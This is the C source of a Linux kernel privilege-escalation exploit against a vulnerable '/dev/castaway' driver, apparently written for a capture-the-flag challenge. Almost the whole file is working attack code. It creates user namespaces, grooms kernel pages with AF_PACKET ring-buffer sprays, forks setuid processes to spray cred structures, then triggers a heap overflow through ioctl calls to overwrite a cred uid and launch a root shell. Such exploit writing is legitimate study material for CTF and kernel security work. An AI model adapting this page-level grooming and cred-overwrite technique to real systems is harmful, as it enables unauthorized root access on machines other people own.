#define _GNU_SOURCE

#include <stdio.h>
#include <stdbool.h>
#include <stdarg.h>
#include <stdlib.h>

#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <pthread.h>
#include <sys/mman.h>

#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <netinet/if_ether.h>
#include <net/if.h>

#define CMD_ALLOC 0xcafebabe
#define CMD_DELETE 0xdeadbabe
#define CMD_EDIT 0xf00dbabe

#define PAGE_SIZE               4096

#define CASTAWAYSLAB_SIZE       PAGE_SIZE
#define CASTAWAYOBJ_SIZE        512
#define CASTAWAYOBJ_MAX         400
#define CASTAWAYOBJS_PERPAGE    (CASTAWAYSLAB_SIZE/CASTAWAYOBJ_SIZE)
#define CASTAWAY_MAXPAGES     (CASTAWAYOBJ_MAX/CASTAWAYOBJS_PERPAGE)

#define CREDJARSLAB_SIZE        PAGE_SIZE
#define CREDJAROBJ_SIZE         128
#define CREDJAROBJS_PERPAGE     (CREDJARSLAB_SIZE/CREDJAROBJ_SIZE)

#define SPRAY_COUNT             (CASTAWAY_MAXPAGES*2)
#define SETUID_SPRAY            (CASTAWAY_MAXPAGES*CREDJAROBJS_PERPAGE)

/* Page spray helpers - https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-72568/poc.c */
bool write_file(const char* file, const char* what, ...) {
	char buf[1024];
	va_list args;
	va_start(args, what);
	vsnprintf(buf, sizeof(buf), what, args);
	va_end(args);
	buf[sizeof(buf) - 1] = 0;
	int len = strlen(buf);

	int fd = open(file, O_WRONLY | O_CLOEXEC);
	if (fd == -1)
		return false;
	if (write(fd, buf, len) != len) {
		close(fd);
		return false;
	}
	close(fd);
	return true;
}

void setup_sandbox(void) {
	int real_uid = getuid();
	int real_gid = getgid();

    puts("[+] Starting sandbox");

    if (unshare(CLONE_NEWUSER) != 0) {
		perror("[-] unshare(CLONE_NEWUSER)");
		exit(EXIT_FAILURE);
	}

    if (unshare(CLONE_NEWNET) != 0) {
		perror("[-] unshare(CLONE_NEWUSER)");
		exit(EXIT_FAILURE);
	}

	if (!write_file("/proc/self/setgroups", "deny")) {
		perror("[-] write_file(/proc/self/set_groups)");
		exit(EXIT_FAILURE);
	}
	if (!write_file("/proc/self/uid_map", "0 %d 1\n", real_uid)){
		perror("[-] write_file(/proc/self/uid_map)");
		exit(EXIT_FAILURE);
	}
	if (!write_file("/proc/self/gid_map", "0 %d 1\n", real_gid)) {
		perror("[-] write_file(/proc/self/gid_map)");
		exit(EXIT_FAILURE);
	}
}

void packet_socket_rx_ring_init(int s, unsigned int block_size,
		unsigned int frame_size, unsigned int block_nr,
		unsigned int sizeof_priv, unsigned int timeout) {
	int v = TPACKET_V3;
	int rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));
	if (rv < 0) {
		perror("[-] setsockopt(PACKET_VERSION)");
		exit(EXIT_FAILURE);
	}

	struct tpacket_req3 req;
	memset(&req, 0, sizeof(req));
	req.tp_block_size = block_size;
	req.tp_frame_size = frame_size;
	req.tp_block_nr = block_nr;
	req.tp_frame_nr = (block_size * block_nr) / frame_size;
	req.tp_retire_blk_tov = timeout;
	req.tp_sizeof_priv = sizeof_priv;
	req.tp_feature_req_word = 0;

	rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
	if (rv < 0) {
		perror("[-] setsockopt(PACKET_RX_RING)");
		exit(EXIT_FAILURE);
	}
}

int packet_socket_setup(unsigned int block_size, unsigned int frame_size,
		unsigned int block_nr, unsigned int sizeof_priv, int timeout) {
	int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (s < 0) {
		perror("[-] socket(AF_PACKET)");
		exit(EXIT_FAILURE);
	}

	packet_socket_rx_ring_init(s, block_size, frame_size, block_nr,
		sizeof_priv, timeout);

	struct sockaddr_ll sa;
	memset(&sa, 0, sizeof(sa));
	sa.sll_family = PF_PACKET;
	sa.sll_protocol = htons(ETH_P_ALL);
	sa.sll_ifindex = if_nametoindex("lo");
	sa.sll_hatype = 0;
	sa.sll_pkttype = 0;
	sa.sll_halen = 0;

	int rv = bind(s, (struct sockaddr *)&sa, sizeof(sa));
	if (rv < 0) {
		perror("[-] bind(AF_PACKET)");
		exit(EXIT_FAILURE);
	}

	return s;
}

void packet_socket_send(int s, char *buffer, int size) {
	struct sockaddr_ll sa;
	memset(&sa, 0, sizeof(sa));
	sa.sll_ifindex = if_nametoindex("lo");
	sa.sll_halen = ETH_ALEN;

	if (sendto(s, buffer, size, 0, (struct sockaddr *)&sa,
			sizeof(sa)) < 0) {
		perror("[-] sendto(SOCK_RAW)");
		exit(EXIT_FAILURE);
	}
}

void loopback_send(char *buffer, int size) {
	int s = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
	if (s == -1) {
		perror("[-] socket(SOCK_RAW)");
		exit(EXIT_FAILURE);
	}

	packet_socket_send(s, buffer, size);
}

int packet_sock_kmalloc() {
	int s = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
	if (s == -1) {
		perror("[-] socket(SOCK_DGRAM)");
		exit(EXIT_FAILURE);
	}
	return s;
}

void packet_sock_timer_schedule(int s, int timeout) {
	packet_socket_rx_ring_init(s, 0x1000, 0x1000, 1, 0, timeout);
}

void packet_sock_id_match_trigger(int s) {
	char buffer[16];
	packet_socket_send(s, &buffer[0], sizeof(buffer));
}

int pagealloc_pad(size_t size, int count) {
	return packet_socket_setup(size, 4096, count, 0, 100);
}

/* Setuid spray helpers */
int step1[2];
int step2[2];
pthread_mutex_t *lock;

void init_mutex(void){
	pthread_mutexattr_t attr;
    pthread_mutexattr_init(&attr);
    pthread_mutexattr_setpshared(&attr, PTHREAD_PROCESS_SHARED);

	lock = mmap(NULL, sizeof(pthread_mutex_t), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	pthread_mutex_init(lock, &attr);
}

void setuid_spray(void){
	char *argv[] = {"/bin/sh", NULL};
	
	// Allocate new cred
	read(step1[0], NULL, 1);
	setuid(1000);

	// Check if root
	read(step2[0], NULL, 1);
	if(getuid() == 0){
		pthread_mutex_lock(lock);
		setreuid(0, 0);
		puts("[+] Got root");
		execve("/bin/sh", (char * const*)&argv, NULL);
		pthread_mutex_lock(lock);
		sleep(13371337);
	}
	exit(0);
}

/* Driver helpers */
int fd;
int edit_count;

typedef struct{
    long objs[CASTAWAYOBJS_PERPAGE];
} page_t;

page_t in_use[CASTAWAY_MAXPAGES];

typedef struct
{
    long idx;
    size_t size;
    void *data;    
} req_t;

void open_dev(void){
    fd = open("/dev/castaway", O_RDONLY);
}

void do_alloc(void){
    ioctl(fd, CMD_ALLOC, 0);
}

void do_edit(long idx, size_t size, void *data){
    req_t req = {
        .idx = idx,
        .size = size,
        .data = data
    };
    ioctl(fd, CMD_EDIT, &req);
}

void new_castaway_page(int idx){
  for (int i = 0; i < CASTAWAYOBJS_PERPAGE; i++){
    do_alloc();
  }
}

void edit_castaway_page(int idx, size_t size, void *data){
	for (int i = 0; i < CASTAWAYOBJS_PERPAGE; i++){
		do_edit(edit_count++, size, data);
	}
}

/* Exploit */
int main(void){
    int sockfds[CASTAWAY_MAXPAGES];
    char payload[CASTAWAYOBJ_SIZE];

    open_dev();
	init_mutex();

	// Create processes for setuid spray
	pipe(step1); pipe(step2);
	for (int _ = 0; _ < SETUID_SPRAY; _++){
		if(!fork()){
			setuid_spray();
		}
	}

	// Namespace to enable setsockopt
	setup_sandbox();

	// Consume existing buddy ord 0 pages
	puts("[+] Consuming buddy ord 0 pages");
	for (int i = 0; i < SPRAY_COUNT; i++){
		pagealloc_pad(PAGE_SIZE, 1);
	}

	// Create padding for vuln/victim objs spray
	puts("[+] Creating page padding");
	for (int i = 0; i < SPRAY_COUNT; i++){
		sockfds[i] =  pagealloc_pad(PAGE_SIZE, 1);
	}

	// Make holes in padding for vuln objs
	for (int i = 0; i < SPRAY_COUNT; i+=2){
		close(sockfds[i]);
	}

	// Fill holes with vuln objs
	puts("[+] Allocating castaway objects");
	for (int i = 0; i < CASTAWAY_MAXPAGES; i++){
		new_castaway_page(i);
	}

	// Make holes in padding for victim objs
	for (int i = 1; i < SPRAY_COUNT; i+=2){
		close(sockfds[i]);
	}

	// Prepare fake cred
	memset(payload, 0, CASTAWAYOBJ_SIZE);
	payload[CASTAWAYOBJ_SIZE-6] = 3;

	// Fill holes with victim objs
	puts("[+] Allocating cred objects");
	for (int i = 0; i < SETUID_SPRAY; i++){
		write(step1[1], "\0", 1);
	}

	// Overwrite cred->uid
	puts("[+] Triggering overflow");
	for (int i = 0; i < CASTAWAY_MAXPAGES; i++){
		edit_castaway_page(i, CASTAWAYOBJ_SIZE, &payload);
	}

	// Check if we are root
	for (int i = 0; i < SETUID_SPRAY; i++){
		write(step2[1], "\0", 1);
	}
	sleep(13371337);

    return 0;
}